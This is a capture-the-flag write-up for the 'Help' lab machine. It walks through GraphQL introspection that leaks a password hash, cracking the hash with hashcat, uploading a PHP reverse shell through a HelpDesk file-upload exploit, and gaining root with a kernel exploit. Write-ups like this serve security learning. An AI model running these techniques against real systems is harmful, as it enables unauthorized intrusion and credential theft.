
## About

Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can be exploited to get a password for SSH Login. Alternatively an unauthenticated arbitrary file upload can be exploited to get RCE. Then the kernel is found to be vulnerable and can be exploited to get a root shell.

## Nmap

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)

80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://help.htb/

3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Port 3000

It is running an API

![](pics/Pasted%20image%2020260831001957.png)

Enum endpoints

```
dirb http://help.htb:3000 /usr/share/wordlists/SecLists/Discovery/Web-Content/graphql.txt 
```

![](pics/Pasted%20image%2020260831003654.png)

Fingerprint the GraphQL using `graphw00f`

```
main.py -d -f -t http://help.htb:3000/
```

![](pics/Pasted%20image%2020260831003739.png)

Learning more about the engine

![](pics/Pasted%20image%2020260831003839.png)

I figured out that the query is sent as a parameter

![](pics/Pasted%20image%2020260831004125.png)

Now lets enumerate the fields

```
query={__schema{types{name,fields{name}}}} 
```

![](pics/Pasted%20image%2020260831004228.png)

Interesting `Query` type `user` which contains `username` and `password` fields.
```
types":[{"name":"Query","fields":[{"name":"user"}]},{"name":"User","fields":[{"name":"username"},{"name":"password"}]}
```

Lets query `user`.

```
query={user{username,password}}
```

![](pics/Pasted%20image%2020260831004924.png)

```
"username":"helpme@helpme.com",
"password":"5d3c93182bb20f07b994a7f617e99cff"
```

Crack the MD5 hash

```
hashcat -m 0 '5d3c93182bb20f07b994a7f617e99cff' /usr/share/wordlists/rockyou.txt
```

![](pics/Pasted%20image%2020260831005529.png)

New Creds

```
"username": helpme@helpme.com
"password": godhelpmeplz
```
## Port 80

Enum endpoints and directories

![](pics/Pasted%20image%2020260831005049.png)

This support endpoint took my intention since the retrieved creds I got from the GraphQL is a support username, so I viewed it.

![](pics/Pasted%20image%2020260831005151.png)

Lets login

![](pics/Pasted%20image%2020260831005644.png)

Searched for CVEs

![](pics/Pasted%20image%2020260831005907.png)

This one is interesting but not useful in this senario

Found an sql injection vulnerability

![](pics/Pasted%20image%2020260831012512.png)

Create a ticket with an Attachment first
![](pics/Pasted%20image%2020260831012437.png)

I faced problems when using this.
I pivoted to this instead:

![](pics/Pasted%20image%2020260831030836.png)

Submit a ticket containing a php shell

![](pics/Pasted%20image%2020260831030742.png)

Run exploit poc

```
python2 40300.py 'http://help.htb/support/uploads/tickets/' php-reverse-shell.php
```

![](pics/Pasted%20image%2020260831030915.png)

Shell!

![](pics/Pasted%20image%2020260831030940.png)

## Flag 1

![](pics/Pasted%20image%2020260831031138.png)

## PrivEsc

Check kernal version

![](pics/Pasted%20image%2020260831031115.png)

Found the kernal exploit

![](pics/Pasted%20image%2020260831032732.png)

copied the `.c` file to the machine, compiled it and run it!

![](pics/Pasted%20image%2020260831032913.png)
## Flag 2

![](pics/Pasted%20image%2020260831032944.png)

Done.

![](pics/Pasted%20image%2020260831032708.png)

